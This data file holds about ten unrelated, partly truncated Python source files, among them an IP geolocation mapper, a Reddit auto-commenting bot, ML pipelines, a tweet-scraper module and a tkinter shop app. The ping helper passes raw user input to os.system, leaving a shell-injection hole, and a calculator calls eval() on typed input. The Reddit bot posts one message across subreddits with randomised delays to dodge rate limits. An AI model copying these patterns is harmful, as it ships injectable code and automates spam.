    "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Oct 26 20:39:25 2024\n\n@author: IAN CARTER KULANI\n\n\n\"\"\"\n\n\nimport os\nimport requests\nimport folium\n\nprint(\"======================================IP GEOLOCATION======================================\\n\")\ndef ping_server(ip):\n    # Ping the server to check connectivity\n    response = os.system(f\"ping -c 1 {ip}\")  # \"-c 1\" sends a single packet (Linux/Mac). Use \"-n 1\" on Windows.\n    return response == 0\n\ndef get_location(ip):\n    # Fetch geolocation info from a free API (e.g., IP-API)\n    response = requests.get(f\"http://ip-api.com/json/{ip}\")\n    if response.status_code == 200:\n        data = response.json()\n        if data['status'] == 'success':\n            return {\n                \"city\": data[\"city\"],\n                \"latitude\": data[\"lat\"],\n                \"longitude\": data[\"lon\"]\n            }\n    return None\n\ndef create_map(location):\n    # Create a map centered on the server location\n    map_obj = folium.Map(location=[location[\"latitude\"], location[\"longitude\"]], zoom_start=10)\n    folium.Marker(\n        [location[\"latitude\"], location[\"longitude\"]],\n        popup=f\"City: {location['city']}\",\n    ).add_to(map_obj)\n    return map_obj\n\ndef main():\n    ip = input(\"Enter the IP address of the server: \")\n   \n    # Ping the server\n    if ping_server(ip):\n        print(f\"Successfully pinged {ip}\")\n       \n        # Get the location of the server\n        location = get_location(ip)\n        if location:\n            print(f\"Server is located in {location['city']}, Lat: {location['latitude']}, Lon: {location['longitude']}\")\n           \n            # Create and display map\n            map_obj = create_map(location)\n            map_obj.save(\"server_location_map.html\")\n            print(\"Map saved as server_location_map.html\")\n        else:\n            print(\"Could not retrieve location data.\")\n    else:\n        print(f\"Could not ping {ip}. Server may be down or unreachable.\")\n\nif __name__ == \"__main__\":\n    main()\n    \n   \nprint(\"==========================================================================================\")",
    "from __future__ import annotations\nfrom dataclasses import dataclass\nfrom typing import List, Optional\nfrom . import _plan\nfrom ._thread import ThreadType, Thread\n\n\n@dataclass(eq=False)\nclass Page(Thread):\n    \"\"\"Represents a Facebook page. Inherits `Thread`.\"\"\"\n\n    #: The page's custom URL\n    url: Optional[str] = None\n    #: The name of the page's location city\n    city: Optional[str] = None\n    #: Amount of likes the page has\n    likes: Optional[int] = None\n    #: Some extra information about the page\n    sub_title: Optional[str] = None\n    #: The page's category\n    category: Optional[List] = None\n\n    def __post_init__(self):\n        self.type = ThreadType.PAGE\n\n    @classmethod\n    def _from_graphql(cls, data)-> Page:\n        if data.get(\"profile_picture\") is None:\n            data[\"profile_picture\"] = {}\n        if data.get(\"city\") is None:\n            data[\"city\"] = {}\n        plan = None\n        if data.get(\"event_reminders\") and data[\"event_reminders\"].get(\"nodes\"):\n            plan = _plan.Plan._from_graphql(data[\"event_reminders\"][\"nodes\"][0])\n\n        return cls(\n            data[\"id\"],\n            url=data.get(\"url\"),\n            city=data.get(\"city\").get(\"name\"),\n            category=data.get(\"category_type\"),\n            photo=data[\"profile_picture\"].get(\"uri\"),\n            name=data.get(\"name\"),\n            message_count=data.get(\"messages_count\"),\n            plan=plan,\n        )\n",
    "import praw\nimport time\nimport random\n\n# List of subreddits where you might want to post\nsubreddits = [\"\", \"\", \"\"]\n\n# Single message to use\nmessage = \"\"\n\n# Set up Reddit API connection\nreddit = praw.Reddit(\n    client_id='',\n    client_secret='',\n    username='',\n    password='',\n    user_agent='python:ricky:v1.0 (by /u/)'\n)\n\n# Post to subreddits with rate limiting in mind\nfor subreddit in subreddits:\n    try:\n        subreddit_instance = reddit.subreddit(subreddit)\n        subreddit_instance.subscribe()  # Join the subreddit\n        \n        # Post a comment on the top post\n        for submission in subreddit_instance.hot(limit=1):  # Adjust the limit as needed\n            submission.reply(message)\n            print(f\"Posted to {subreddit}: {message}\")\n            \n            # Sleep to avoid rate limiting\n            time.sleep(random.randint(600, 900))  # Random delay between 10-15 minutes\n    except praw.exceptions.RedditAPIException as e:\n        print(f\"An error occurred in subreddit {subreddit}: {e}\")\n        if \"RATELIMIT\" in str(e):\n            delay = int(e.message.split(\" \")[-2]) * 60  # Extract recommended wait time\n            print(f\"Rate limit hit. Waiting for {delay} seconds.\")\n            time.sleep(delay)\n    except Exception as e:\n        print(f\"An unexpected error occurred in subreddit {subreddit}: {e}\")\n        time.sleep(300)  # Sleep for 5 minutes to recover\n",
    "# Ultralytics YOLO \ud83d\ude80, AGPL-3.0 license\n\nimport argparse\n\nimport cv2.dnn\nimport numpy as np\n\nfrom ultralytics.utils import ASSETS, yaml_load\nfrom ultralytics.utils.checks import check_yaml\n\nCLASSES = yaml_load(check_yaml(\"coco128.yaml\"))[\"names\"]\ncolors = np.random.uniform(0, 255, size=(len(CLASSES), 3))\n\n\ndef draw_bounding_box(img, class_id, confidence, x, y, x_plus_w, y_plus_h):\n    \"\"\"\n    Draws bounding boxes on the input image based on the provided arguments.\n\n    Args:\n        img (numpy.ndarray): The input image to draw the bounding box on.\n        class_id (int): Class ID of the detected object.\n        confidence (float): Confidence score of the detected object.\n        x (int): X-coordinate of the top-left corner of the bounding box.\n        y (int): Y-coordinate of the top-left corner of the bounding box.\n        x_plus_w (int): X-coordinate of the bottom-right corner of the bounding box.\n        y_plus_h (int): Y-coordinate of the bottom-right corner of the bounding box.\n    \"\"\"\n    label = f\"{CLASSES[class_id]} ({confidence:.2f})\"\n    color = colors[class_id]\n    cv2.rectangle(img, (x, y), (x_plus_w, y_plus_h), color, 2)\n    cv2.putText(img, label, (x - 10, y - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, color, 2)\n\n\ndef main(onnx_model, input_image):\n    \"\"\"\n    Main function to load ONNX model, perform inference, draw bounding boxes, and display the output image.\n\n    Args:\n        onnx_model (str): Path to the ONNX model.\n        input_image (str): Path to the input image.\n\n    Returns:\n        list: List of dictionaries containing detection information such as class_id, class_name, confidence, etc.\n    \"\"\"\n    # Load the ONNX model\n    model: cv2.dnn.Net = cv2.dnn.readNetFromONNX(onnx_model)\n\n    # Read the input image\n    original_image: np.ndarray = cv2.imread(input_image)\n    [height, width, _] = original_image.shape\n\n    # Prepare a square image for inference\n    length = max((height, width))\n    image = np.zeros((length, length, 3), np.uint8)\n    image[0:height, 0:width] = original_image\n\n    # Calculate scale factor\n    scale = length / 640\n\n    # Preprocess the image and prepare blob for model\n    blob = cv2.dnn.blobFromImage(image, scalefactor=1 / 255, size=(640, 640), swapRB=True)\n    model.setInput(blob)\n\n    # Perform inference\n    outputs = model.forward()\n\n    # Prepare output array\n    outputs = np.array([cv2.transpose(outputs[0])])\n    rows = outputs.shape[1]\n\n    boxes = []\n    scores = []\n    class_ids = []\n\n    # Iterate through output to collect bounding boxes, confidence scores, and class IDs\n    for i in range(rows):\n        classes_scores = outputs[0][i][4:]\n        (minScore, maxScore, minClassLoc, (x, maxClassIndex)) = cv2.minMaxLoc(classes_scores)\n        if maxScore >= 0.25:\n            box = [\n                outputs[0][i][0] - (0.5 * outputs[0][i][2]),\n                outputs[0][i][1] - (0.5 * outputs[0][i][3]),\n                outputs[0][i][2],\n                outputs[0][i][3],\n            ]\n            boxes.append(box)\n            scores.append(maxScore)\n            class_ids.append(maxClassIndex)\n\n    # Apply NMS (Non-maximum suppression)\n    result_boxes = cv2.dnn.NMSBoxes(boxes, scores, 0.25, 0.45, 0.5)\n\n    detections = []\n\n    # Iterate through NMS results to draw bounding boxes and labels\n    for i in range(len(result_boxes)):\n        index = result_boxes[i]\n        box = boxes[index]\n        detection = {\n            \"class_id\": class_ids[index],\n            \"class_name\": CLASSES[class_ids[index]],\n            \"confidence\": scores[index],\n            \"box\": box,\n            \"scale\": scale,\n        }\n        detections.append(detection)\n        draw_bounding_box(\n            original_image,\n            class_ids[index],\n            scores[index],\n            round(box[0] * scale),\n            round(box[1] * scale),\n            round((box[0] + box[2]) * scale),\n            round((box[1] + box[3]) * scale),\n        )\n\n    # Display the image with bounding boxes\n    cv2.imshow(\"image\", original_image)\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\n    return detections\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--model\", default=\"yolov8n.onnx\", help=\"Input your ONNX model.\")\n    parser.add_argument(\"--img\", default=str(ASSETS / \"bus.jpg\"), help=\"Path to input image.\")\n    args = parser.parse_args()\n    main(args.model, args.img)\n",
    "import os\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.preprocessing import StandardScaler\n\ndef preprocess_data():\n    # \u52a0\u8f7d\u6570\u636e\n    data = pd.read_csv('data/raw/social_media_user_data.csv')\n\n    # \u68c0\u67e5\u7f3a\u5931\u503c\n    print(\"\u7f3a\u5931\u503c\u7edf\u8ba1\uff1a\")\n    print(data.isnull().sum())\n\n    # \u5904\u7406\u7f3a\u5931\u503c\n    # \u5bf9\u6570\u503c\u578b\u5217\u7528\u5747\u503c\u586b\u5145\n    numeric_columns = data.select_dtypes(include=['int64', 'float64']).columns\n    data[numeric_columns] = data[numeric_columns].fillna(data[numeric_columns].mean())\n\n    # \u5bf9\u975e\u6570\u503c\u578b\u5217\u7528\u4f17\u6570\u586b\u5145\uff08\u6216\u5220\u9664\u7f3a\u5931\u503c\uff09\n    non_numeric_columns = data.select_dtypes(exclude=['int64', 'float64']).columns\n    for col in non_numeric_columns:\n        data[col] = data[col].fillna(data[col].mode()[0])  # \u7528\u4f17\u6570\u586b\u5145\n\n    # \u5904\u7406\u91cd\u590d\u6570\u636e\n    data.drop_duplicates(inplace=True)\n\n    # \u5904\u7406\u5f02\u5e38\u503c\uff08\u5047\u8bbe LoginFrequency \u4e0d\u80fd\u4e3a\u8d1f\u6570\uff09\n    data = data[data['LoginFrequency'] >= 0]\n\n    # \u4fdd\u5b58\u6e05\u6d17\u540e\u7684\u6570\u636e\n    os.makedirs('data/processed', exist_ok=True)\n    data.to_csv('data/processed/cleaned_data.csv', index=False)\n    print(\"\u6570\u636e\u6e05\u6d17\u5b8c\u6210\uff0c\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230 'data/processed/cleaned_data.csv'\")\n\n    # \u7279\u5f81\u63d0\u53d6\u4e0e\u8f6c\u6362\n    data['AvgDailyPosts'] = data['PostCount'] / 30\n    data['WeeklyInteractions'] = data['Likes'] + data['Comments'] + data['Shares']\n    features = ['Age', 'LoginFrequency', 'AvgDailyPosts', 'WeeklyInteractions', 'FriendCountChange']\n    X = data[features]\n    y = data['Churn']\n\n    # \u5212\u5206\u8bad\u7ec3\u96c6\u548c\u6d4b\u8bd5\u96c6\n    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)\n\n    # \u7279\u5f81\u6807\u51c6\u5316\n    scaler = StandardScaler()\n    X_train = scaler.fit_transform(X_train)\n    X_test = scaler.transform(X_test)\n\n    # \u4fdd\u5b58\u5904\u7406\u540e\u7684\u6570\u636e\n    pd.DataFrame(X_train, columns=features).to_csv('data/splits/X_train.csv', index=False)\n    pd.DataFrame(X_test, columns=features).to_csv('data/splits/X_test.csv', index=False)\n    y_train.to_csv('data/splits/y_train.csv', index=False)\n    y_test.to_csv('data/splits/y_test.csv', index=False)\n    print(\"\u6570\u636e\u5904\u7406\u5b8c\u6210\uff0c\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230 'data/splits/' \u6587\u4ef6\u5939\u4e0b\")\n\nif __name__ == '__main__':\n    preprocess_data()\n",
    "from datetime import datetime\n\nfrom . import format, get\nfrom .tweet import Tweet\nfrom .user import User\nfrom .storage import db, elasticsearch, write, panda\n\nimport logging as logme\n\nfollows_list = []\ntweets_list = []\nusers_list = []\n\nauthor_list = {''}\nauthor_list.pop()\n\n# used by Pandas\n_follows_object = {}\n\n\ndef _formatDateTime(datetimestamp):\n    try:\n        return int(datetime.strptime(datetimestamp, \"%Y-%m-%d %H:%M:%S\").timestamp())\n    except ValueError:\n        return int(datetime.strptime(datetimestamp, \"%Y-%m-%d\").timestamp())\n\n\ndef _clean_follow_list():\n    logme.debug(__name__ + ':clean_follow_list')\n    global _follows_object\n    _follows_object = {}\n\n\ndef clean_lists():\n    logme.debug(__name__ + ':clean_lists')\n    global follows_list\n    global tweets_list\n    global users_list\n    follows_list = []\n    tweets_list = []\n    users_list = []\n\n\ndef datecheck(datetimestamp, config):\n    logme.debug(__name__ + ':datecheck')\n    if config.Since:\n        logme.debug(__name__ + ':datecheck:SinceTrue')\n\n        d = _formatDateTime(datetimestamp)\n        s = _formatDateTime(config.Since)\n\n        if d < s:\n            return False\n    if config.Until:\n        logme.debug(__name__ + ':datecheck:UntilTrue')\n\n        d = _formatDateTime(datetimestamp)\n        s = _formatDateTime(config.Until)\n\n        if d > s:\n            return False\n    logme.debug(__name__ + ':datecheck:dateRangeFalse')\n    return True\n\n\n# TODO In this method we need to delete the quoted tweets, because twitter also sends the quoted tweets in the\n#  `tweets` list along with the other tweets\ndef is_tweet(tw):\n    try:\n        tw[\"data-item-id\"]\n        logme.debug(__name__ + ':is_tweet:True')\n        return True\n    except:\n        logme.critical(__name__ + ':is_tweet:False')\n        return False\n\n\ndef _output(obj, output, config, **extra):\n    logme.debug(__name__ + ':_output')\n    if config.Lowercase:\n        if isinstance(obj, str):\n            logme.debug(__name__ + ':_output:Lowercase:username')\n            obj = obj.lower()\n        elif obj.__class__.__name__ == \"user\":\n            logme.debug(__name__ + ':_output:Lowercase:user')\n            pass\n        elif obj.__class__.__name__ == \"tweet\":\n            logme.debug(__name__ + ':_output:Lowercase:tweet')\n            obj.username = obj.username.lower()\n            author_list.update({obj.username})\n            for dct in obj.mentions:\n                for key, val in dct.items():\n                    dct[key] = val.lower()\n            for i in range(len(obj.hashtags)):\n                obj.hashtags[i] = obj.hashtags[i].lower()\n            for i in range(len(obj.cashtags)):\n                obj.cashtags[i] = obj.cashtags[i].lower()\n        else:\n            logme.info('_output:Lowercase:hiddenTweetFound')\n            print(\"[x] Hidden tweet found, account suspended due to violation of TOS\")\n            return\n    if config.Output != None:\n        if config.Store_csv:\n            try:\n                write.Csv(obj, config)\n                logme.debug(__name__ + ':_output:CSV')\n            except Exception as e:\n                logme.critical(__name__ + ':_output:CSV:Error:' + str(e))\n                print(str(e) + \" [x] output._output\")\n        elif config.Store_json:\n            write.Json(obj, config)\n            logme.debug(__name__ + ':_output:JSON')\n        else:\n            write.Text(output, config.Output)\n            logme.debug(__name__ + ':_output:Text')\n\n    if config.Elasticsearch:\n        logme.debug(__name__ + ':_output:Elasticsearch')\n        print(\"\", end=\".\", flush=True)\n    else:\n        if not config.Hide_output:\n            try:\n                print(output.replace('\\n', ' '))\n            except UnicodeEncodeError:\n                logme.critical(__name__ + ':_output:UnicodeEncodeError')\n                print(\"unicode error [x] output._output\")\n\n\nasync def checkData(tweet, config, conn):\n    logme.debug(__name__ + ':checkData')\n    tweet = Tweet(tweet, config)\n    if not tweet.datestamp:\n        logme.critical(__name__ + ':checkData:hiddenTweetFound')\n        print(\"[x] Hidden tweet found, account suspended due to violation of TOS\")\n        return\n    if datecheck(tweet.datestamp + \" \" + tweet.timestamp, config):\n        output = format.Tweet(config, tweet)\n        if config.Database:\n            logme.debug(__name__ + ':checkData:Database')\n            db.tweets(conn, tweet, config)\n        if config.Pandas:\n            logme.debug(__name__ + ':checkData:Pandas')\n            panda.update(tweet, config)\n        if config.Store_object:\n            logme.debug(__name__ + ':checkData:Store_object')\n            if hasattr(config.Store_object_tweets_list, 'append'):\n                config.Store_object_tweets_list.append(tweet)\n            else:\n                tweets_list.append(tweet)\n        if config.Elasticsearch:\n            logme.debug(__name__ + ':checkData:Elasticsearch')\n            elasticsearch.Tweet(tweet, config)\n        _output(tweet, output, config)\n   ",
    "# -*- coding: utf-8 -*-\n\"\"\"TELEPHONE\u7c7b\n\u7535\u8bdd\u53f7\u7801 <=> \u4e2d\u6587\u5b57\u7b26\u4e32 \u65b9\u6cd5\n\u4e2d\u6587\u5b57\u7b26\u4e32 <=> \u7535\u8bdd\u53f7\u7801 \u65b9\u6cd5\n\"\"\"\n\n__author__ = \"Zhiyang Zhou <zyzhou@stu.xmu.edu.cn>\"\n__data__ = \"2019-05-03\"\n\nfrom fish_speech.text.chn_text_norm.basic_util import *\n\n\nclass TelePhone:\n    \"\"\"\n    TELEPHONE\u7c7b\n    \"\"\"\n\n    def __init__(self, telephone=None, raw_chntext=None, chntext=None):\n        self.telephone = telephone\n        self.raw_chntext = raw_chntext\n        self.chntext = chntext\n\n    # def chntext2telephone(self):\n    #     sil_parts = self.raw_chntext.split('<SIL>')\n    #     self.telephone = '-'.join([\n    #         str(chn2num(p)) for p in sil_parts\n    #     ])\n    #     return self.telephone\n\n    def telephone2chntext(self, fixed=False):\n\n        if fixed:\n            sil_parts = self.telephone.split(\"-\")\n            self.raw_chntext = \"<SIL>\".join(\n                [num2chn(part, alt_two=False, use_units=False) for part in sil_parts]\n            )\n            self.chntext = self.raw_chntext.replace(\"<SIL>\", \"\")\n        else:\n            sp_parts = self.telephone.strip(\"+\").split()\n            self.raw_chntext = \"<SP>\".join(\n                [num2chn(part, alt_two=False, use_units=False) for part in sp_parts]\n            )\n            self.chntext = self.raw_chntext.replace(\"<SP>\", \"\")\n        return self.chntext\n\n\nif __name__ == \"__main__\":\n\n    # \u6d4b\u8bd5\u7a0b\u5e8f\n    print(TelePhone(telephone=\"0595-23980880\").telephone2chntext())\n    # print(TelePhone(raw_chntext='\u96f6\u4e94\u4e5d\u4e94\u6760\u4e8c\u4e09\u516b\u516d\u4e94\u96f6\u4e5d\u516b').chntext2telephone())\n",
    "\n##main code here:\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nimport xgboost as xgb\nfrom sklearn.metrics import accuracy_score, classification_report\n\n# Load datasets\napplication_data = pd.read_csv('application_record.csv')\ncredit_data = pd.read_csv('credit_record.csv')\n\n# Merge datasets\nmerged_data = application_data.merge(credit_data, on='ID')\n\n# Define a mapping for STATUS values to numeric scores\nstatus_map = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, 'C': 0, 'X': 5}\n\ndef preprocess_status(status_sequence):\n    \"\"\"Convert STATUS sequence to numeric-friendly format.\"\"\"\n    numeric_sequence = []\n    for char in status_sequence:\n        if char in status_map:\n            numeric_sequence.append(status_map[char])\n        else:\n            numeric_sequence.append(5)  # Default to high risk for unexpected values\n    return sum(numeric_sequence)  # Aggregate the risk score\n\n# Apply preprocessing to the STATUS column\ncredit_data['Processed_STATUS'] = credit_data['STATUS'].apply(\n    lambda x: ''.join(char if char in status_map else 'X' for char in x)\n)\ncredit_summary = credit_data.groupby('ID')['Processed_STATUS'].apply(preprocess_status).reset_index(name='Risk_Score')\n\n# Merge risk score back into the main dataset\nmerged_data = merged_data.merge(credit_summary, on='ID', how='left')\n\n# Preprocess application data\nmerged_data['Age'] = (-merged_data['DAYS_BIRTH']) // 365  # Convert days to years\nmerged_data['Years_Employed'] = (-merged_data['DAYS_EMPLOYED']) // 365  # Convert days to years\n\n# Encode categorical variables\ncategorical_cols = ['CODE_GENDER', 'FLAG_OWN_CAR', 'FLAG_OWN_REALTY',\n                    'NAME_INCOME_TYPE', 'NAME_EDUCATION_TYPE',\n                    'NAME_FAMILY_STATUS', 'NAME_HOUSING_TYPE', 'OCCUPATION_TYPE']\n\nfor col in categorical_cols:\n    merged_data[col] = merged_data[col].fillna('Unknown')\n\n# One-hot encoding for categorical data\nmerged_data = pd.get_dummies(merged_data, columns=categorical_cols, drop_first=True)\n\n# Handle missing values\nnumeric_cols = merged_data.select_dtypes(include=[np.number]).columns\nmerged_data[numeric_cols] = merged_data[numeric_cols].fillna(merged_data[numeric_cols].median())\n\nnon_numeric_cols = merged_data.select_dtypes(exclude=[np.number]).columns\nmerged_data[non_numeric_cols] = merged_data[non_numeric_cols].fillna('Unknown')\n\n# Select features and target for the model\nfeatures = [\n    'AMT_INCOME_TOTAL', 'CNT_CHILDREN', 'CNT_FAM_MEMBERS', 'Age',\n    'Years_Employed', 'Risk_Score'\n] + [col for col in merged_data.columns if col.startswith(tuple(categorical_cols))]\n\nmerged_data['Approval_Status'] = np.where(merged_data['Risk_Score'] < 10, 1, 0)\n\nX = merged_data[features]\ny = merged_data['Approval_Status']\n\n# Split data into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Train the model using XGBoost\nparams = {\n    'objective': 'binary:logistic',\n    'eval_metric': 'logloss',\n    'learning_rate': 0.1,\n    'max_depth': 6,\n    'n_estimators': 100\n}\n\n# Use xgboost.cv for hyperparameter tuning (alternatively to RandomizedSearchCV)\ndtrain = xgb.DMatrix(X_train, label=y_train)\n\n# Perform cross-validation using xgboost\ncv_results = xgb.cv(\n    params=params,\n    dtrain=dtrain,\n    num_boost_round=200,\n    nfold=3,\n    early_stopping_rounds=10,\n    metrics='logloss',\n    as_pandas=True\n)\n\nbest_iteration = cv_results['test-logloss-mean'].idxmin()  # Get the best iteration based on logloss\nprint(f'Best iteration: {best_iteration}')\n\n# Train the final model using the best iteration\nfinal_model = xgb.train(params=params, dtrain=dtrain, num_boost_round=best_iteration)\n\n# Predict using the trained model\ndtest = xgb.DMatrix(X_test)\ny_pred = final_model.predict(dtest)\n\n# Convert prediction probabilities to binary class labels\ny_pred_binary = (y_pred > 0.5).astype(int)\n\n# Calculate accuracy and print classification report\naccuracy = accuracy_score(y_test, y_pred_binary)\nprint(f'Accuracy: {accuracy:.4f}')\nprint(classification_report(y_test, y_pred_binary))\n\n\n    ###\n    ###\n    ### for sample manual input testing .\n    ###\n    ###\n\nsample_input = {\n    'AMT_INCOME_TOTAL': [300000],\n    'CNT_CHILDREN': [2],\n    'CNT_FAM_MEMBERS': [4],\n    'Age': [30],\n    'Years_Employed': [5],\n    'Risk_Score': [8],\n    # Add one-hot encoded values for categorical columns, initializing all to 0\n    'CODE_GENDER_M': [1],\n    'FLAG_OWN_CAR_Y': [1],\n    'FLAG_OWN_REALTY_Y': [1],\n    'NAME_INCOME_TYPE_Working': [1],\n    'NAME_EDUCATION_TYPE_Secondary': [1],\n    'NAME_FAMILY_STATUS_Married': [1],\n    'NAME_HOUSING_TYPE_Employee': [1],\n    'OCCUPATION_TYPE_Security Staff': [1]\n    # ... (add other one-hot encoded features with value 0)\n}\n\n# Convert the sample input into a DataFrame\nsample_df = pd.DataFrame(sample_input)\n\n# Get missing columns and add them to sample_df\nmissing_cols = set(features) - set(sample_df.columns)\nfor col in missing_cols:\n    sample_df[col] = 0  # Fill",
    "# Copyright (c) 2020 Mobvoi Inc. (authors: Binbin Zhang, Xiaoyu Chen, Di Wu)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom __future__ import print_function\n\nimport argparse\nimport copy\nimport logging\nimport os\nimport sys\n\nimport torch\nimport yaml\nfrom torch.utils.data import DataLoader\n\nfrom wenet.dataset.dataset_deprecated import AudioDataset, CollateFunc\nfrom wenet.transformer.asr_model import init_asr_model\nfrom wenet.utils.checkpoint import load_checkpoint\n\nif __name__ == '__main__':\n    print(\"\"\"\n!!! This file is deprecated, and we are planning to remove it in\nthe future, please move to the new IO !!!\n    \"\"\")\n    parser = argparse.ArgumentParser(description='recognize with your model')\n    parser.add_argument('--config', required=True, help='config file')\n    parser.add_argument('--test_data', required=True, help='test data file')\n    parser.add_argument('--gpu',\n                        type=int,\n                        default=-1,\n                        help='gpu id for this rank, -1 for cpu')\n    parser.add_argument('--checkpoint', required=True, help='checkpoint model')\n    parser.add_argument('--dict', required=True, help='dict file')\n    parser.add_argument('--beam_size',\n                        type=int,\n                        default=10,\n                        help='beam size for search')\n    parser.add_argument('--penalty',\n                        type=float,\n                        default=0.0,\n                        help='length penalty')\n    parser.add_argument('--result_file', required=True, help='asr result file')\n    parser.add_argument('--batch_size',\n                        type=int,\n                        default=16,\n                        help='asr result file')\n    parser.add_argument('--mode',\n                        choices=[\n                            'attention', 'ctc_greedy_search',\n                            'ctc_prefix_beam_search', 'attention_rescoring'\n                        ],\n                        default='attention',\n                        help='decoding mode')\n    parser.add_argument('--ctc_weight',\n                        type=float,\n                        default=0.0,\n                        help='ctc weight for attention rescoring decode mode')\n    parser.add_argument('--decoding_chunk_size',\n                        type=int,\n                        default=-1,\n                        help='''decoding chunk size,\n                                <0: for decoding, use full chunk.\n                                >0: for decoding, use fixed chunk size as set.\n                                0: used for training, it's prohibited here''')\n    parser.add_argument('--num_decoding_left_chunks',\n                        type=int,\n                        default=-1,\n                        help='number of left chunks for decoding')\n    parser.add_argument('--simulate_streaming',\n                        action='store_true',\n                        help='simulate streaming inference')\n    parser.add_argument('--reverse_weight',\n                        type=float,\n                        default=0.0,\n                        help='''right to left weight for attention rescoring\n                                decode mode''')\n    args = parser.parse_args()\n    print(args)\n    logging.basicConfig(level=logging.DEBUG,\n                        format='%(asctime)s %(levelname)s %(message)s')\n    os.environ['CUDA_VISIBLE_DEVICES'] = str(args.gpu)\n\n    if args.mode in ['ctc_prefix_beam_search', 'attention_rescoring'\n                     ] and args.batch_size > 1:\n        logging.fatal(\n            'decoding mode {} must be running with batch_size == 1'.format(\n                args.mode))\n        sys.exit(1)\n\n    with open(args.config, 'r') as fin:\n        configs = yaml.load(fin, Loader=yaml.FullLoader)\n\n    raw_wav = configs['raw_wav']\n    # Init dataset and data loader\n    # Init dataset and data loader\n    test_collate_conf = copy.deepcopy(configs['collate_conf'])\n    test_collate_conf['spec_aug'] = False\n    test_collate_conf['spec_sub'] = False\n    test_collate_conf['feature_dither'] = False\n    test_collate_conf['speed_perturb'] = False\n    if raw_wav:\n        test_collate_conf['wav_distortion_conf']['wav_distortion_rate'] = 0\n        test_collate_conf['wav_distortion_conf']['wav_dither'] = 0.0\n    test_collate_func = CollateFunc(**test_collate_conf, raw_wav=raw_wav)\n    dataset_conf = configs.get('dataset_conf', {})\n    dataset_conf['batch_size'] = args.batch_size\n    dataset",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nimport time\r\n\r\n# Funci\u00f3n para mostrar la barra de carga\r\ndef mostrar_barra_carga():\r\n    for i in range(101):\r\n        progress['value'] = i\r\n        root.update_idletasks()\r\n        time.sleep(0.03)\r\n    ventana_principal()\r\n\r\n# Funci\u00f3n para calcular el total\r\ndef calcular_total():\r\n    total = 0\r\n    for item in lista_pedidos:\r\n        total += item['precio']\r\n    total_label.config(text=f\"Total: ${total:.2f}\")\r\n\r\n# Funci\u00f3n para agregar un pedido\r\ndef agregar_pedido():\r\n    tipo = tipo_var.get()\r\n    sabor = sabor_var.get()\r\n    precio = float(precio_var.get())\r\n    lista_pedidos.append({'tipo': tipo, 'sabor': sabor, 'precio': precio})\r\n    lista_pedidos_texto.insert(tk.END, f\"{tipo} de {sabor} - ${precio:.2f}\\n\")\r\n    calcular_total()\r\n\r\n# Funci\u00f3n para mostrar la ventana principal\r\ndef ventana_principal():\r\n    barra_carga_frame.pack_forget()\r\n    ventana_principal_frame.pack()\r\n\r\n# Funci\u00f3n para abrir la calculadora\r\ndef abrir_calculadora():\r\n    calculadora = tk.Toplevel(root)\r\n    calculadora.title(\"Calculadora\")\r\n    \r\n    def click(boton):\r\n        current = entrada.get()\r\n        entrada.delete(0, tk.END)\r\n        entrada.insert(0, current + str(boton))\r\n    \r\n    def clear():\r\n        entrada.delete(0, tk.END)\r\n    \r\n    def igual():\r\n        try:\r\n            result = eval(entrada.get())\r\n            entrada.delete(0, tk.END)\r\n            entrada.insert(0, str(result))\r\n        except:\r\n            entrada.delete(0, tk.END)\r\n            entrada.insert(0, \"Error\")\r\n    \r\n    entrada = tk.Entry(calculadora, width=16, font=('Arial', 18), borderwidth=2, relief=\"solid\")\r\n    entrada.grid(row=0, column=0, columnspan=4)\r\n    \r\n    botones = [\r\n        '7', '8', '9', '/',\r\n        '4', '5', '6', '*',\r\n        '1', '2', '3', '-',\r\n        '0', '.', '=', '+'\r\n    ]\r\n    \r\n    row_val = 1\r\n    col_val = 0\r\n    for boton in botones:\r\n        action = lambda x=boton: click(x)\r\n        if boton == \"=\":\r\n            tk.Button(calculadora, text=boton, width=10, height=3, command=igual).grid(row=row_val, column=col_val, columnspan=2)\r\n            col_val += 2\r\n        else:\r\n            tk.Button(calculadora, text=boton, width=5, height=3, command=action).grid(row=row_val, column=col_val)\r\n            col_val += 1\r\n        if col_val > 3:\r\n            col_val = 0\r\n            row_val += 1\r\n    \r\n    tk.Button(calculadora, text=\"C\", width=5, height=3, command=clear).grid(row=row_val, column=0)\r\n\r\n# Configuraci\u00f3n de la ventana principal\r\nroot = tk.Tk()\r\nroot.title(\"Sistema de Empanadas\")\r\n\r\n# Frame para la barra de carga\r\nbarra_carga_frame = tk.Frame(root)\r\nbarra_carga_frame.pack(pady=20)\r\nbienvenida_label = tk.Label(barra_carga_frame, text=\"Bienvenido/a al puesto de empanadas\", font=(\"Helvetica\", 16))\r\nbienvenida_label.pack(pady=10)\r\nprogress = ttk.Progressbar(barra_carga_frame, orient=tk.HORIZONTAL, length=300, mode='determinate')\r\nprogress.pack(pady=10)\r\n\r\n# Frame para la ventana principal\r\nventana_principal_frame = tk.Frame(root)\r\n\r\n# Variables\r\ntipo_var = tk.StringVar()\r\nsabor_var = tk.StringVar()\r\nprecio_var = tk.StringVar()\r\nlista_pedidos = []\r\n\r\n# Widgets de la ventana principal\r\npedido_frame = tk.Frame(ventana_principal_frame)\r\npedido_frame.grid(row=0, column=0, padx=10, pady=5)\r\n\r\ntk.Label(pedido_frame, text=\"Tipo de Empanada:\").grid(row=0, column=0, 